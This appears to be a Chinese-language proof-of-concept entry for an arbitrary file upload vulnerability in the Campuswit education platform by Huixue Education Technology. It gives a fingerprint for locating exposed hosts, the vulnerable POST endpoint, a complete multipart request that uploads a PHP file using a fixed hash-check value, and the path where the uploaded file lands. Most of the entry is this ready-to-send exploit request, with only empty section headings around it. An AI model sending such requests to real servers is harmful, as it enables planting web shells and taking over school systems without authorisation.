# 慧学教育科技（北京）有限公司CampuswituploadFiles存在任意文件上传漏洞

- **系统**：慧学教育科技（北京）有限公司　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="campuswit"`
- **请求**：`POST /v1/public/uploadFiles HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 412`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="keep_filename"
1
--00content0boundary00
Content-Disposition: form-data; name="check_file"
1
--00content0boundary00
Content-Disposition: form-data; name="campuswitHash"
campuswit_hash_success
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php
1234
--00content0boundary00--

文件上传位置
/uploads/attachments/2024/03/26/1.php
```

**其他**
- 慧学教育科技（北京）有限公司Campuswit uploadFiles存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Campuswit系统